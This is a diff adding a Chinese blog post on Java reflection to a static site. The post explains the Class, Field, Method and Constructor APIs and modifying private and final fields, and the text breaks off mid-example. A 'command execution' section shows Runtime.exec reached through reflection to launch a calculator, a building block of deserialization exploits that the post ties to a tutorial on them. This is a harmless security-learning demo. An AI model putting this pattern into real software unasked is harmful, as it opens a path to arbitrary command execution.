@@ -185,6 +185,158 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/05/31/java%E5%8F%8D%E5%B0%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/31/java%E5%8F%8D%E5%B0%84/" class="post-title-link" itemprop="url">java反射</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-05-31 08:44:30" itemprop="dateCreated datePublished" datetime="2024-05-31T08:44:30+08:00">2024-05-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-01 14:27:48" itemprop="dateModified" datetime="2024-06-01T14:27:48+08:00">2024-06-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA/" itemprop="url" rel="index"><span itemprop="name">JAVA</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。</p>
+<h2 id="Java反射组成相关的类"><a href="#Java反射组成相关的类" class="headerlink" title="Java反射组成相关的类"></a>Java反射组成相关的类</h2><p>java.lang.Class：类对象;</p>
+<p>java.lang.reflect.Constructor：类的构造器对象;</p>
+<p>java.lang.reflect.Field：类的属性对象;</p>
+<p>java.lang.reflect.Method：类的方法对象;</p>
+<h2 id="实例化对象的方法"><a href="#实例化对象的方法" class="headerlink" title="实例化对象的方法"></a>实例化对象的方法</h2><h4 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h4><p>如果上下⽂中存在某个类的实例 <code>obj</code>，那么我们可以通过 <code>obj.getClass</code> 来获取它的类。</p>
+<h4 id="使用类的-class-方法"><a href="#使用类的-class-方法" class="headerlink" title="使用类的 .class 方法"></a>使用类的 .class 方法</h4><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p>
+<h4 id="Class-forName-String-className-：动态加载类"><a href="#Class-forName-String-className-：动态加载类" class="headerlink" title="Class.forName(String className)：动态加载类"></a>Class.forName(String className)：动态加载类</h4><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p>
+<h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p>
+<p>Field[] getFields() ：获取所有 public 修饰的成员变量</p>
+<p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p>
+<p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p>
+<p>Field getDeclaredField(String name) 获取指定的成员变量</p>
+<h2 id="获取成员方法-Method"><a href="#获取成员方法-Method" class="headerlink" title="获取成员方法 Method"></a>获取成员方法 Method</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的public方法</span></span><br><span class="line"></span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的所有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span></span><br><span class="line"></span><br><span class="line">Method[] getMethods() <span class="comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class="line"></span><br><span class="line">Method[] getDeclaredMethods() <span class="comment">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="获取构造函数-Constructor"><a href="#获取构造函数-Constructor" class="headerlink" title="获取构造函数 Constructor"></a>获取构造函数 Constructor</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>获取 class 实例 之后</p>
+<ul>
+<li>获取类名：<code>forName()</code></li>
+<li>创建对应类型的实例：<code>newInstance()</code></li>
+<li>获取字段的值：<code>get()</code>、设置字段的值：<code>set()</code></li>
+<li>获取方法：<code>getMethod()</code>、调用方法：<code>invoke()</code></li>
+</ul>
+<hr>
+<p>基本知识就是这些，如何执行命令呢，举个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalReflectionCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//创建一个runtime的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">c2</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//获取getRuntime的方法</span></span><br><span class="line">        c2.setAccessible(<span class="literal">true</span>);<span class="comment">//使getRuntime可访问，因为getRuntime是私有属性</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> c2.invoke(<span class="literal">null</span>);<span class="comment">//调用静态方法，无需实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">        m1.invoke(o1,<span class="string">&quot;calc&quot;</span>);<span class="comment">//弹计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是调用静态方法，不需要实例</p>
+<p>当然也可以实现一个新实例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalReflectionCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取Runtime的Class对象</span></span><br><span class="line">        Constructor c2=c1.getDeclaredConstructor();<span class="comment">//获取Runtime类的无参构造函数</span></span><br><span class="line">        c2.setAccessible(<span class="literal">true</span>);<span class="comment">//使getRuntime可访问</span></span><br><span class="line">        Object c3=c2.newInstance();<span class="comment">//创建Runtime的新实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(c3,<span class="string">&quot;calc&quot;</span>);<span class="comment">//弹计算器</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/#0x08-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8">Java反序列化基础篇-02-Java反射与URLDNS链分析</a>参考链接，写的很清晰</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/noKing/p/9038234.html#/">Java反射</a></p>
+<hr>
+<h2 id="Java反射修改字段"><a href="#Java反射修改字段" class="headerlink" title="Java反射修改字段"></a>Java反射修改字段</h2><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.PrivatePerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">PrintMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        PrintMethod.invoke(m);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m, <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;aaaaa&quot;</span>));</span><br><span class="line">        PrintMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivatePerson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">StringBuilder</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>static单独出现的话，用getDeclaredField也可以</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.PrivatePerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span>c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        f.invoke(m);</span><br><span class="line">        Field ff=c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ff.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lvzhouhang&quot;</span>));</span><br><span class="line">        f.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>final 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。<strong>直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。</strong></p>
+<h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalStraightPerson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;lvzhouhang&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">21</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; &quot;</span>+age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalStraightReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.FinalStraightPerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">printMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printInfo&quot;</span>);</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m,<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line">        ageField.set(m,<span class="string">&quot;20&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样通过反射修改会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String</span><br><span class="line">	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)</span><br><span class="line">	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)</span><br><span class="line">	at sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100)</span><br><span class="line">	at java.lang.reflect.Field.set(Field.java:764)</span><br><span class="line">	at src.FinalStraightReflect.main(FinalStraightReflect.java:18)</span><br></pre></td></tr></table></figure>
+
+<p>为什么呢？</p>
+<p>因为JVM在编译时期, 就把final类型的String进行了优化, 在编译时期就会把String处理成常量，只要是让name的值经过运行才能获得, 那么就不会被处理为常量。</p>
+<h3 id="间接修改"><a href="#间接修改" class="headerlink" title="间接修改"></a>间接修改</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InDirectReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.InDirectPerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">printMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printInfo&quot;</span>);</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">sexField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sexField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m,<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line">        ageField.set(m,<span class="number">200</span>);</span><br><span class="line">        sexField.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;female&quot;</span>));</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InDirectPerson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;male&quot;</span>);</span><br><span class="line">    <span class="comment">// 经过逻辑判断产生的变量赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="literal">null</span>!=<span class="literal">null</span>?<span class="number">20</span>:<span class="number">20</span>);</span><br><span class="line">    <span class="comment">// 通过构造函数进行赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InDirectPerson</span><span class="params">()</span>&#123;</span><br><span class="line">        name = <span class="string">&quot;lvzhouhang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; &quot;</span>+age+<span class="string">&quot; &quot;</span>+sex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就修改成功了</p>
+<h3 id="static-final"><a href="#static-final" class="headerlink" title="static+final"></a>static+final</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticreflection</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">StringBuilder</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticflectioncalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">finalstaticreflection</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">finalstaticreflection</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getClass().getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        m.invoke(c);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getClass().getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(c,<span class="keyword">new</span> <span class="title 